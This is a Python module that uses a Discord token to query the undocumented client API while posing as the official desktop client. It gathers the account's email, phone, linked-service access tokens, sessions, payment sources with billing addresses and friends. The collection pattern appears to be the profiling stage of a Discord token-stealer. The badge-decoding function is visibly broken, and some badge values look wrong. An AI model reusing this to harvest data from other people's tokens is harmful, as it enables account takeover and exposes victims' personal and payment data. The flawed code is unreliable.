import requests
import json
from utils.paths import json_to_obj
from base64 import b64encode

from typing import Dict, List


PROPERTIES = b64encode(json.dumps({
    "os": "windows",
    "browser": "Discord Client",
    "release_channel": "stable",
    "client_version": "0.1.9",
    "os_version": "10.0.19044",
    "os_arch": "x64",
    "system_locale": "en-US",
    "client_build_number": 164497,
    "client_event_source": None
}).encode()).decode()


BADGES = {
    "Discord Staff": 1,
    "Discord Partner": 2,
    "Hypesquad Event": 4,
    "Bug Hunter": 8,
    "Bravery": 64,
    "Brilliance": 128,
    "Early Supporter": 512,
    "Gold Bug Hunter": 16374,
    "Early Verified Bot Developer": 131072,
    "Active Developer": 4194304,
    "Moderator Programs Alumni": 587584
}


def ConvertBadges(flag: int) -> Dict[str, int]:
    badges = {}
    for k, v in BADGES:
        if flag == 0:
            badges["None"] = 0
        elif v == (v << flag):
            badges[k] = v
    return badges


def ConvertNitro(subscription_type: int) -> str:
    match subscription_type:
        case 0:
            return "None"
        case 1:
            return "Nitro Basic"
        case 2:
            return "Nitro Boost"


class DiscordUser:
    def __init__(self):
        self.id = ""
        self.username = ""
        self.avatar = ""
        self.discriminator = ""
        self.public_flags = 0
        self.flags = 0
        self.banner = None
        self.accent_color = 0
        self.global_name = ""
        self.avatar_decoration = None
        self.banner_color = ""
        self.mfa_enabled = False
        self.locale = ""
        self.premium_type = 0
        self.email = ""
        self.verified = False
        self.phone = ""
        self.nsfw_allowed = False
        self.linked_users = []
        self.purchased_flags = 0
        self.bio = ""
        self.token = ""

        self.conections: List[DiscordConnection] = []
        self.devices: List[DiscordDevice] = []
        self.paymentsrc: List[DiscordPaymentSource] = []
        self.friends: List[DiscordFriend] = []


class DiscordConnection:
    def __init__(self):
        self.id = ""
        self.name = ""
        self.type = ""
        self.friend_sync = False
        self.integrations = []
        self.metadata_visibility = 0
        self.show_activity = False
        self.two_way_link = False
        self.verified = False
        self.visibility = 0
        self.revoked = False
        self.access_token = ""


class DiscordDevice:
    class ClientInfo:
        def __init__(self):
            self.os = ""
            self.platform = ""
            self.location = ""

    def __init__(self):
        self.id_hash = ""
        self.approx_last_used_time = ""
        self.client_info = None


class DiscordPaymentSource:
    class BillingAddress:
        def __init__(self):
            self.name = ""
            self.line_1 = ""
            self.line_2 = None
            self.city = ""
            self.state = ""
            self.country = ""
            self.postal_code = ""

    def __init__(self):
        self.id = ""
        self.type = 0
        self.invalid = False
        self.flags = 0
        self.email = ""
        self.billing_address = None
        self.country = ""
        self.payment_gateway = 0
        self.default = False


class DiscordFriend:
    class User:
        def __init__(self):
            self.avatar = None
            self.avatar_decoration = None
            self.discriminator = None
            self.global_name = None
            self.id = None
            self.public_flags = None
            self.username = None

    def __init__(self):
        self.id = None
        self.nickname = None
        self.type = None
        self.user = None


class Discord:
    def __init__(self, token: str):
        self.token = token
        self.api = "https://discord.com/api/v9"

    def makeRequest(self, url):
        r = requests.get(url, headers={
            "Authorization": self.token,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9011 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36",
            "x-super-properties": PROPERTIES
        })
        return r

    def GetUser(self) -> DiscordUser:
        payload = self.makeRequest(self.api + "/users/@me")
        if payload.status_code == 401:
            raise ValueError(payload.json()["message"])
        obj: DiscordUser = json_to_obj(payload.json(), DiscordUser)
        obj.token = self.token
        obj.conections = self.GetConnections()
        obj.devices = self.GetDevices()
        obj.paymentsrc = self.GetPaymentSources()
        obj.friends = self.GetFriends()
        return obj

    def GetFriends(self):
        payload = self.makeRequest(self.api + "/users/@me/relationships")
        if payload.status_code == 401:
            raise ValueError(payload.json()["message"])
        res = []
        for obj in payload.json():
            user = json_to_obj(obj["user"], DiscordFriend.User)
            friend: DiscordFriend = json_to_obj(obj, DiscordFriend)
            friend.user = user
            res.append(friend)
        return res

    def GetConnections(self) -> List[DiscordConnection]:
        payload = self.makeRequest(self.api + "/users/@me/connections")
        if payload.status_code == 401:
            raise ValueError(payload.json()["message"])
        res = []
        for obj in payload.json():
            res.append(json_to_obj(obj, DiscordConnection))
        return res

    def GetDevices(self) -> List[DiscordDevice]:
        payload = self.makeRequest(self.api + "/auth/sessions")
        if payload.status_code == 401:
            raise ValueError(payload.json()["message"])
        res = []
        for obj in payload.json()["user_sessions"]:
            clientinfo = json_to_obj(obj["client_info"], DiscordDevice.ClientInfo)
            device = json_to_obj(obj, DiscordDevice)
            device.client_info = clientinfo
            res.append(device)
        return res

    def GetPaymentSources(self) -> List[DiscordPaymentSource]:
        payload = self.makeRequest(self.api + "/users/@me/billing/payment-sources")
        if payload.status_code == 401:
            raise ValueError(payload.json()["message"])
        res = []
        for obj in payload.json():
            billingaddress = json_to_obj(obj["billing_address"], DiscordPaymentSource.BillingAddress)
            paymentsrc = json_to_obj(obj, DiscordPaymentSource)
            paymentsrc.billing_address = billingaddress
            res.append(paymentsrc)
        return res
